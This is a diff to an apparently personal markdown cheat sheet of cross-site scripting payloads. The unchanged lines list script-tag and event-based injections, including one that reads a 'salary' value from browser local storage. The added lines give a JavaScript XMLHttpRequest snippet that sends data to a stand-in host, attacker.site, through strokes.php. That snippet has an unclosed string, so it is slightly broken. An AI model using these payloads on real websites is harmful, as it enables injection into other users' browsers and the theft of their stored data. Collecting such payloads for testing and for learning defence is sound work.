@@ -15,6 +15,15 @@ Cross-Site-Scripting just for fun.
     - When the **<script>** is being filtered by the Web Application, you can use javascript events.
   - **<script>alert(localStorage.getItem('salary'))</script>**
     - To collect sensitive information stored in Browser Local Storage.
+
+## Javascript useful codes:
+  - To perform HTTP GET request
+  ```
+  var xhttp = new XMLHttpRequest(); //Init xhttp object
+	xhttp.open("GET", "https://attacker.site/strokes.php?data=data, true); //GET request
+	xhttp.send(); //Send request
+  ```
+  
  
 ## Automated Detection
   ## xss4fun.py
